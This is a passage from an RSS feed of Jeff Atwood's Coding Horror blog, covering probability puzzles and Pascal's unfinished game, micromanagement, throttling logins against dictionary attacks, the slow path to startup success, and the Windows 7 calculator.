We can use that information to come up with a better, more correct answer. <b>We know this person has two children</b>. What are all possible combinations of two children?
</p>
<p>
<code>BB, GB, BG, GG</code>
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
<b>We know that one of the children is a girl</b>. This rules out one of those possible combinations of two children (BB), so we're left with:
</p>
<p>
<code>GB, BG, GG</code>
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Of the remaining three possibilities, <i>two</i> include boys.
</p>
<p>
<code>GB, BG</code>
</p>
<p>
Thus, <b>the odds of this person having a boy and a girl is 2/3 or 66%</b>.
</p>
<p>
I noticed a few comments where people complained that the GB and BG possibilities are the same thing, and should have been reduced to
</p>
<p>
<code>BG/GB, GG</code>
</p>
<p>
Which equates to 1/2 or 50%.
</p>
<p>
If you made this mistake, you're in good company: so did <a href="http://en.wikipedia.org/wiki/Blaise_Pascal">Blaise Pascal</a>, as the book <a href="http://www.amazon.com/dp/0465009107/?tag=codihorr-20">The Unfinished Game: Pascal, Fermat, and the Seventeenth-Century Letter that Made the World Modern</a> explains.
</p>
<p>
<a href="http://www.amazon.com/dp/0465009107/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
Here's how Keith Devlin describes the famous letter:
</p>
<p>
</p>
<blockquote>
In 1654, the gambler Antoine Gombaud, whose noble title was the Chevalier de Mere, apporached his friend Pascal with some questions about games of chance, including the problem of the unfinished game. After some thought, Pascal found a possible solution but was not completely sure his reasoning was correct. Accordingly, he sent his ideas to Fermat to see if his countryman agreed with the argument. The brief exchange of letters that ensued -- and one letter in particular -- represented one of the most profound advancements in the history of mathematical thought.
</blockquote>
<p>
I'll tell you one thing I learned from this book: <b>It's amazing how many early advancements in math were based on gambling</b>. I guess it's sort of the same historical relationship between video technology and pornography. Not that there's anything wrong with that. Anyway, the "unfinished game" I alluded to in my previous post title is the central topic of these letters between <a href="http://en.wikipedia.org/wiki/Blaise_Pascal">Blaise Pascal</a> and <a href="http://en.wikipedia.org/wiki/Pierre_de_Fermat">Pierre Fermat</a>. Here's a modernized, slightly simplified version of it:
</p>
<p>
</p>
<blockquote>
Two players, Harry and Ted, place equal bets on who will win the best of 5 coin tosses. In each round, Harry always chooses heads (H), and Ted always chooses tails (T). Suppose they are forced to abandon the game after 3 coin tosses, with Harry ahead 2 to 1. What is the fairest way to divide the pot?
</blockquote>
<p>
Let's enumerate all possible outcomes from the 2 remaining coin tosses.
</p>
<p>
<code>HH HT TH TT</code>
</p>
<p>
Only 1 of these 4 possibilities allows Ted to win. Thus, if the game has to be abandoned, the pot should be split 3/4 to Harry and 1/4 to Ted.
</p>
<p>
But, since Harry is already ahead 2 to 1, you might argue that it's nonsensical to consider all those "extra" possibilities; as soon as Harry gets that third head on a coin toss, the game is over. Thus, <b>we only need to consider possibilities where the game would actually continue</b>:
</p>
<p>
<code>H TH TT</code>
</p>
<p>
By this accounting, Harry would get 2/3 of the pot, and Ted 1/3. We know this is wrong. By leaving the game "unfinished" and not enumerating every possibility -- we've made a mistake. But how?
</p>
<p>
You don't need to be a mathematician to prove this. I'm just a crappy programmer, and even my crappy code can brute force the answer by simulating results from thousands of games.
</p>
<p>
</p>
<pre>
var rand = new Random();
var results = new Dictionary&lt;string, int&gt;();
int tosses = 2;
for (int i = 0; i &lt; 10000; i++)
{
string result = "HHT";
for (int toss = 0; toss &lt; tosses; toss++)
{
result += (rand.Next(2) == 0) ? "H" : "T";
if (Regex.Matches(result, "H").Count == 3 || Regex.Matches(result, "T").Count == 3) break;
}
if (results.ContainsKey(result))
results[result]++;
else
results.Add(result, 1);
}
foreach (var item in results)
{
Console.WriteLine(item.Key + " : " + item.Value);
}
</pre>
<p>
</p>
<table width="175">
<tr>
<td><code>HHTTT</code></td>
<td align="right">2,438</td>
</tr>
<tr>
<td><code>HHTTH</code></td>
<td align="right">2,457</td>
</tr>
<tr>
<td><code>HHTH</code></td>
<td align="right">5,105</td>
</tr>
</table>
<p>
<b>The unfinished games are not equally likely!</b> But the results are definitely clear, and agree with what the <b>equally likely finished games</b> predicted: 75% for Harry, and 25% for Ted.
</p>
<p>
I've made awfully similar "unfinished game" mistakes before, in particular when <a href="http://www.codinghorror.com/blog/archives/001015.html">writing a card shuffling algorithm</a>. It was my hope in presenting this problem that you'll be able to recognize it too the next time you see it, even if the math behind it is not at all intuitive.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-31T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/finishing-the-game/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Are You Creating Micromanagement Zombies? ]]></title>
<link>https://blog.codinghorror.com/are-you-creating-micromanagement-zombies/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Do you manage other programmers, in any capacity? Then take <a href="http://headrush.typepad.com/creating_passionate_users/2005/12/braindeath_by_m.html">Kathy Sierra's quiz</a>:
</p>
<p>
</p>
<ol>
<li>Do you pride yourself on being "on top of" the projects or your direct reports? Do you have a solid grasp of the details of every project?<br><br>
</li>
<li>Do you believe that you could perform most of the tasks of your direct reports, and potentially do a better job?<br><br>
</li>
<li>Do you pride yourself on frequent communication with your employees? Does that communication include asking them for detailed status reports and updates?<br><br>
</li>
<li>Do you believe that being a manager means that you have more knowledge and skills than your employees, and thus are better equipped to make decisions?<br><br>
</li>
<li>Do you believe that you care about things (quality, deadlines, etc.) more than your employees?
</li>
</ol>
<p>
A "yes" to any of these -- even a half-hearted "maybe" -- means <b>you might be creating Micromanagement Zombies</b>.
</p>
<p>
<a href="http://www.imdb.com/title/tt0063350/"><img alt="image placeholder" >
</p>
<p>
That's right, Zombies. Mindless automatons who can barely do anything except exactly what they are ordered to do, and even then, only when someone is strictly monitoring <i>what</i> they're doing and <i>how</i> they're doing it. Micromanaging the people you work with is arguably the exact opposite of what a competent team leader or manager should be spending their time doing. So if you're micromanaging at all, even the teeny tiniest little bit, step back and take a long, hard look. It's a sign of deeper problems.
</p>
<p>
Beyond that, <b>who the heck wants to work with zombies anyway?</b> Shouldn't you endeavor to work with the type of people who are good enough at their jobs that they can make sensible decisions about what they're doing? And they're not constantly <i>trying to eat your brain?</i> Well, figuratively speaking.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Building teams is like building software. It's easier to <a href="http://www.codinghorror.com/blog/archives/000889.html">describe what <i>not</i> to do</a> than it is to identify the intangibles that make good software development teams jell. But it's pretty clear that micromanagement is one of the biggest risks. In <a href="http://www.amazon.com/exec/obidos/ASIN/0932633439/codihorr-20">Peopleware</a>, DeMarco and Lister establish seven anti-patterns they dubbed <b>Teamicide</b>:
</p>
<p>
</p>
<ol>
<li>Defensive Management
</li>
<li>Bureaucracy
</li>
<li>Physical Separation
</li>
<li>Fragmentation of People's Time
</li>
<li>Quality Reduction of the Product
</li>
<li>Phony Deadlines
</li>
<li>Clique Control
</li>
</ol>
<p>
Wondering what number one encompasses? You guessed it: micromanagement.
</p>
<p>
</p>
<blockquote>
If you're the manager, of course you're going to feel that your judgment is better than that of people under you. You have more experience and perhaps a higher standard of excellence than they have; that's how you got to be the manager. At any point in the project where you don't interpose your own judgment, your people are more likely to make a mistake. So what? Let them make some mistakes. That doesn't mean you can't override a decision (very occasionally) or give specific direction to the project. But if the staff comes to believe it's not allowed to make any errors of its own, the message that you don't trust them comes through loud and clear. <b>There is no message you can send that will better inhibit team formation.</b>
<p>
Most managers give themselves excellent grades on knowing when to trust their people and when not to. But in our experience, too many managers err on the side of mistrust. They follow the basic premise that their people may operate completely autonomously, as long as they operate correctly. This amounts to no autonomy at all. The only freedom that has any meaning is the
freedom to proceed differently from the way your manager would have proceeded. This is true in a broader sense, too: The right to be right (in your manager's eyes or in your government's eyes) is irrelevant; it's only the right to be wrong that makes you free.
</p>
<p>
The most obvious defensive management ploys are <a href="http://www.codinghorror.com/blog/archives/000203.html">prescriptive Methodologies</a> ("My people are too dumb to build systems without them") and technical interference by the manager. Both are doomed to fail in the long run. In addition, they make for efficient teamicide. <b>People who feel untrusted have little inclination to bond together into a cooperative team.</b>
</p>
</blockquote>
<p>
In the end, isn't <b>trust</b> what this is about? If you don't trust the people you work with -- and most importantly, actively <i>demonstrate</i> that trust through your actions -- should you really be working with them at all?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2009-01-04T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/are-you-creating-micromanagement-zombies/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Dictionary Attacks 101 ]]></title>
<link>https://blog.codinghorror.com/dictionary-attacks-101/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Several high profile Twitter accounts <a href="http://blog.wired.com/27bstroke6/2009/01/professed-twitt.html">were recently hijacked</a>:
</p>
<p>
</p>
<blockquote>
An 18-year-old hacker with a history of celebrity pranks has admitted to Monday's hijacking of multiple high-profile Twitter accounts, including President-Elect Barack Obama's, and the official feed for Fox News.
<p>
The hacker, who goes by the handle GMZ, told Threat Level on Tuesday he gained entry to Twitter's administrative control panel by pointing an automated password-guesser at a popular user's account. The user turned out to be a member of Twitter's support staff, who'd chosen the weak password "happiness."
</p>
<p>
Cracking the site was easy, because <b>Twitter allowed an unlimited number of rapid-fire log-in attempts</b>.
</p>
<p>
"I feel it's another case of administrators not putting forth effort toward one of the most obvious and overused security flaws," he wrote in an IM interview. "I'm sure they find it difficult to admit it."
</p>
</blockquote>
<p>
If you're a moderator or administrator it is <i>especially</i> negligent to have such an easily guessed password. But the real issue here is the way Twitter allowed unlimited, as-fast-as-possible login attempts.
</p>
<p>
Given the <b>average user's password choices</b> -- as documented by Bruce Schneier's <a href="http://www.schneier.com/blog/archives/2006/12/realworld_passw.html">analysis of 34,000 actual MySpace passwords</a> captured from a <a href="http://www.codinghorror.com/blog/archives/000852.html">phishing attack</a> in late 2006 -- this is a pretty scary scenario.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Based on this data, the average MySpace user has an 8 character alphanumeric password. Which isn't great, but doesn't sound <i>too</i> bad. That is, until you find out that 28 percent of those alphanumerics were all lowercase with a single final digit -- and two-thirds of the time that final digit was 1!
</p>
<p>
Yes, <a href="http://www.codinghorror.com/blog/archives/000631.html">brute force attacks are still for dummies</a>. Even the typically terrible MySpace password -- eight character all lowercase, ending in 1, would require around 8 billion login attempts:
</p>
<p>
</p>
<pre>
26 x 26 x 26 x 26 x 26 x 26 x 26 x 1  = 8,031,810,176
</pre>
<p>
At one attempt per second, that would take more than 250 years. <i>Per user!</i>
</p>
<p>
But a <a href="http://en.wikipedia.org/wiki/Dictionary_attack">dictionary attack</a>, like the one used in the Twitter hack? Well, that's another story. The entire Oxford English Dictionary <a href="http://www.askoxford.com/asktheexperts/faq/aboutenglish/numberwords">contains around 171,000</a> words. As you might imagine, the average person only uses a tiny fraction of those words, by some estimates <a href="http://www.worldwidewords.org/articles/howmany.htm">somewhere between 10 and 40 thousand</a>. At one attempt per second, we could try <b>every word in the Oxford English Dictionary in slightly less than two days</b>.
</p>
<p>
Clearly, the <i>last</i> thing you want to do is give attackers carte blanche to run unlimited login attempts. All it takes is one user with a weak password to provide attackers a toehold in your system. In Twitter's case, the attackers really hit the jackpot: the user with the weakest password happened to be a member of the Twitter administrative staff.
</p>
<p>
<b>Limiting the number of login attempts per user is security 101.</b> If you don't do this, you're practically setting out a welcome mat for anyone to launch a dictionary attack on your site, an attack that gets statistically more effective every day the more users you attract. In some systems, your account can get locked out if you try and fail to log in a certain number of times in a row. This can lead to denial of service attacks, however, and is generally discouraged. It's more typical for each failed login attempt to take longer and longer, like so:
</p>
<p>
</p>
<table width="250">
<tr>
<td>1st failed login</td>
<td>no delay</td>
</tr>
<tr>
<td>2nd failed login</td>
<td>2 sec delay</td>
</tr>
<tr>
<td>3rd failed login</td>
<td>4 sec delay</td>
</tr>
<tr>
<td>4th failed login</td>
<td>8 sec delay</td>
</tr>
<tr>
<td>5th failed login</td>
<td>16 sec delay</td>
</tr>
</table>
<p>
And so on. Alternately, you could display a <a href="http://en.wikipedia.org/wiki/Captcha">CAPTCHA</a> after the fourth attempt.
</p>
<p>
There are endless variations of this technique, but the net effect is the same: attackers can only try a handful of passwords each day. A brute force attack is out of the question, and a broad dictionary attack becomes impractical, at least in any kind of human time.
</p>
<p>
It's tempting to blame Twitter here, but honestly, I'm not sure they're alone. I <a href="http://www.codinghorror.com/blog/archives/000546.html">forget my passwords a lot</a>. I've made at least five or six attempts to guess my password on multiple websites and I can't recall ever experiencing any sort of calculated delay or account lockouts. I'm reasonably sure the big commercial sites have this mostly figured out. But since <a href="http://www.codinghorror.com/blog/archives/001121.html">every rinky-dink website on the planet demands that I create unique credentials especially for them</a>, any of them could be vulnerable. <b>You better hope they're <i>all</i> smart enough to throttle failed logins</b> -- and that you're careful to use unique credentials on every single website you visit.
</p>
<p>
Maybe this was less of a problem in the <a href="http://www.codinghorror.com/blog/archives/000599.html">bad old days of modems</a>, as there were severe physical limits on how fast data could be transmitted to a website, and how quickly that website could respond. But today, we have the one-two punch of naive websites running on blazing fast hardware, and users with speedy broadband connections. Under these conditions, I could see attackers regularly achieving up to two password attempts per second.
</p>
<p>
If you thought of dictionary attacks as mostly a desktop phenomenon, perhaps it's time to revisit that assumption. As Twitter illustrates, the web now offers ripe conditions for dictionary attacks. I urge you to test your website, or any websites you use -- and <b>make sure they all have some form of failed login throttling in place.</b>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2009-01-07T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/dictionary-attacks-101/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Overnight Success: It Takes Years ]]></title>
<link>https://blog.codinghorror.com/overnight-success-it-takes-years/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Paul Buchheit, the original lead developer of GMail, notes that <a href="http://paulbuchheit.blogspot.com/2009/01/overnight-success-takes-long-time.html">the success of GMail was a long time in coming:</a></p>
<blockquote>We starting working on Gmail in August 2001. For a long time, almost everyone disliked it. Some people used it anyway because of the search, but they had endless complaints. Quite a few people thought that we should kill the project, or perhaps "reboot" it as an enterprise product with native client software, not this crazy Javascript stuff. Even when we got to the point of launching it on April 1, 2004 -- two and a half years after starting work on it -- many people inside of Google were predicting doom. The product was too weird, and nobody wants to change email services. I was told that we would never get a million users.
<p>Once we launched, the response was surprisingly positive, except from the people who hated it for a variety of reasons. Nevertheless, it was frequently described as "niche", and "not used by real people outside of silicon valley".</p>
<p>Now, almost 7 1/2 years after we started working on Gmail, I see [an <a href="http://www.ft.com/cms/s/0/18cdabec-d8fb-11dd-ab5f-000077b07658.html">article</a> describing how Gmail grew 40% last year, compared to 2% for Yahoo and -7% for Hotmail].</p>
</blockquote>
<p>Paul has since left Google and now works at his own startup, <a href="http://friendfeed.com/">FriendFeed</a>. Many industry insiders have not been kind to FriendFeed. Stowe Boyd even went so far as to <a href="http://www.stoweboyd.com/message/2009/01/lewis-gray-on-w.html">call FriendFeed a failure</a>. Paul takes this criticism in stride:</p>
<blockquote>Creating an important new product generally takes time. FriendFeed needs to continue changing and improving, just as Gmail did six years ago. FriendFeed shows a lot of promise, but it's still a "work in progress".
<p>My expectation is that big success takes years, and there aren't many counter-examples (other than YouTube, and they didn't actually get to the point of making piles of money just yet). Facebook grew very fast, but it's almost 5 years old at this point. Larry and Sergey started working on Google in 1996 -- when I started there in 1999, few people had heard of it yet.</p>
<p><strong>This notion of overnight success is very misleading, and rather harmful. If you're starting something new, expect a long journey.</strong> That's no excuse to move slow though. To the contrary, you must move very fast, otherwise you will never arrive, because it's a long journey! This is also why it's important to be frugal -- you don't want to <a href="http://paulbuchheit.blogspot.com/2008/03/ideas-vs-judgment-and-execution_9197.html">starve to death halfway up the mountain</a>.</p>
</blockquote>
<p>Stowe Boyd illustrated <a href="http://www.stoweboyd.com/message/2009/01/lewis-gray-on-w.html">his point about FriendFeed</a> with a graph comparing Twitter and FriendFeed traffic. Allow me to update Mr. Boyd's graph with another data point of my own.</p>
<p><a href="http://siteanalytics.compete.com/twitter.com+friendfeed.com+stackoverflow.com/?metric=uv"><img alt="image placeholder" >
<p>I find Paul's attitude refreshing, because I take the same attitude toward <em>our</em> startup, <a href="http://stackoverflow.com">Stack Overflow</a>. I have zero expectation or even desire for overnight success. What I am planning is several years of grinding through constant, steady improvement.</p>
<p>This business plan isn't much different from my career development plan: <strong>success takes years</strong>. And when I say years, I really mean it! Not as some cliched regurgitation of "work smarter, not harder." I'm talking actual <em>calendar years</em>. You know, of the 12 months, 365 days variety. You will literally have to spend multiple years of your life grinding away at this stuff, waking up every day and doing it over and over, practicing and gathering feedback each day to continually get better. It might be unpleasant at times and even downright un-fun occasionally, but it's necessary.</p>
<p>This is hardly unique or interesting advice. Peter Norvig's classic <a href="http://www.norvig.com/21-days.html">Teach Yourself Programming in Ten Years</a> already covered this topic far better than I.</p>
<blockquote>Researchers have shown it takes about ten years to develop expertise in any of a wide variety of areas, including chess playing, music composition, telegraph operation, painting, piano playing, swimming, tennis, and research in neuropsychology and topology. The key is <em>deliberative</em> practice: not just doing it again and again, but challenging yourself with a task that is just beyond your current ability, trying it, analyzing your performance while and after doing it, and correcting any mistakes. Then repeat. And repeat again.
<p>There appear to be no real shortcuts: even Mozart, who was a musical prodigy at age 4, took 13 more years before he began to produce world-class music. The Beatles seemed to burst onto the scene with a string of #1 hits and an appearance on the Ed Sullivan show in 1964. But they had been playing small clubs in Liverpool and Hamburg since 1957, and while they had mass appeal early on, their first great critical success, Sgt. Peppers, was released in 1967.</p>
</blockquote>
<p>Honestly, I look forward to waking up someday two or three years from now and doing the exact same thing I did today: working on the Stack Overflow code, eking out yet another tiny improvement or useful feature. Obviously we want to succeed. But on some level, success is irrelevant, because <strong>the process is inherently satisfying</strong>. Waking up every day and doing something you love -- even better, surrounded by a community who loves it too -- is its own reward. Despite being a metric ton of work.</p>
<p>The blog is no different. I often give aspiring bloggers <a href="http://www.codinghorror.com/blog/archives/000983.html">this key piece of advice</a>: if you're starting a blog, don't expect anyone to read it for six months. If you do, I can guarantee you will be sorely disappointed. However, if you can stick to a posting schedule and produce one or two quality posts every week for an entire calendar year... then, and <em>only</em> then, can you expect to see a trickle of readership. I started this blog in 2004, and it took a solid <strong>three years</strong> of writing 3 to 5 times per week before it <a href="http://www.codinghorror.com/blog/archives/000781.html">achieved</a> anything resembling popularity within the software development community.</p>
<p>I fully expect to be writing on this blog, in one form or another, for the rest of my life. It is a part of who I am. And with that bit of drama out of the way, I have no illusions: ultimately, I'm <a href="http://comics.com/pearls_before_swine/2008-11-16/">just the guy on the internet who writes that blog</a>.</p>
<p><a href="http://comics.com/pearls_before_swine/2008-11-16/"><img alt="image placeholder" >
<p>That's perfectly fine by me. I never said I was clever.</p>
<p>Whether you ultimately achieve readers, or pageviews, or whatever <a href="http://www.codinghorror.com/blog/archives/000717.html">high score table</a> it is we're measuring this week, try to remember it's worth doing because, well -- <em>it's worth doing</em>.</p>
<p>And if you keep doing it long enough, who knows? You might very well wake up one day and <strong>find out you're an overnight success</strong>.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2009-01-08T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/overnight-success-it-takes-years/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ If You Don't Change the UI, Nobody Notices ]]></title>
<link>https://blog.codinghorror.com/if-you-dont-change-the-ui-nobody-notices/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I saw a screenshot a few days ago that made me think <a href="http://technet.microsoft.com/en-us/evalcenter/dd353205.aspx">Windows 7 Beta</a> might actually be worth checking out.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
That's right, Microsoft finally <a href="http://lifehacker.com/5078756/windows-7s-calculator-bundles-real+life-uses">improved the calculator app!</a> We've been complaining for <i>years</i> that Microsoft ships new operating systems with the same boring old default applets the previous version had, which <a href="http://www.codinghorror.com/blog/archives/000441.html">makes the entire operating system look bad</a>:
</p>
<p>
</p>
<blockquote>
I know it sounds trivial. But isn't the fit and finish of little applets like these -- Notepad, Calculator, Character Map, Paint, Disk Cleanup, Compressed Folders, and dozens of others -- indicative of the care and design that goes into the entire operating system? If Microsoft can't be bothered to bundle a version of Notepad that has basic amenities like a toolbar, what hope does the rest of the operating system have?
</blockquote>
<p>
If you visually compare Calculator and Notepad in 2001-era Windows XP with their 2007 Windows Vista equivalents, you might conclude they're identical. But, <a href="http://blogs.msdn.com/oldnewthing/archive/2004/05/25/141253.aspx">as Raymond Chen notes</a>, this isn't so:
</p>
<p>
</p>
<blockquote>
I find it ironic when people complain that Calc and Notepad haven't changed. In fact, both programs have changed. (Notepad gained some additional menu and status bar options. Calc got a severe workover.) I wouldn't be surprised if these are the same people who complain, "Why does Microsoft spend all its effort on making Windows 'look cool'? They should spend all their efforts on making technical improvements and just stop making visual improvements."
<p>
And with Calc, that's exactly what happened: Massive technical improvements. No visual improvement. And nobody noticed. In fact, the complaints just keep coming. "Look at Calc, same as it always was."
</p>
<p>
The innards of Calc - the arithmetic engine - was completely thrown away and rewritten from scratch. The standard IEEE floating point library was replaced with an arbitrary-precision arithmetic library. This was done after people kept writing ha-ha articles about how Calc couldn't do decimal arithmetic correctly, that for example computing 10.21 - 10.2 resulted in 0.0100000000000016. Today, Calc's internal computations are done with infinite precision for basic operations (addition, subtraction, multiplication, division) and 32 digits of precision for advanced operations (square root, transcendental operators).
</p>
</blockquote>
<p>
It's arguably the perfect Raymond Chen post -- technically dead on, while simultaneously proving that <b>being technically dead on is <i>utterly irrelevant</i>.</b> That's Raymond Chen for you: he's a riddle wrapped in a mystery inside an enigma, slathered in delicious secret sauce.
</p>
<p>
This is why the screenshot of the Windows 7 Calculator, although seemingly trivial, is so exciting to me. It's evidence that Microsoft is going to pay attention to the <b>visible</b> parts of the operating system this time around. I'm a fan of Vista, despite all the <a href="http://techreport.com/discussions.x/13303">nerd rage</a> on the topic, but I'll be the first to admit that Vista had all the polish of <a href="http://www.codinghorror.com/blog/archives/001126.html">a particularly dull rock</a>. Let's just say the overall user experience was.. uninspiring. This led many people to shrug, sigh "why bother?", and stick with crusty old XP.
</p>
<p>
This was unfortunate, because if you dug into Vista, you'd find quite a few substantive technical improvements over the <a href="http://www.codinghorror.com/blog/archives/000646.html">now-ancient Windows XP</a>. But many of those improvements were <a href="http://en.wikipedia.org/wiki/Technical_features_new_to_Windows_Vista">under the hood</a>, and thus invisible to the typical user.
</p>
<p>
<a href="http://www.codinghorror.com/blog/archives/000572.html"><img alt="image placeholder" >
</p>
<p>
Remember, <a href="http://www.codinghorror.com/blog/archives/000572.html">if the user can't find it, the function's not there</a>. <b>Don't bother improving your product unless it results in <i>visible</i> changes</b> the user can see, find, and hopefully appreciate.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2009-01-11T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/if-you-dont-change-the-ui-nobody-notices/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
</channel>
</rss>
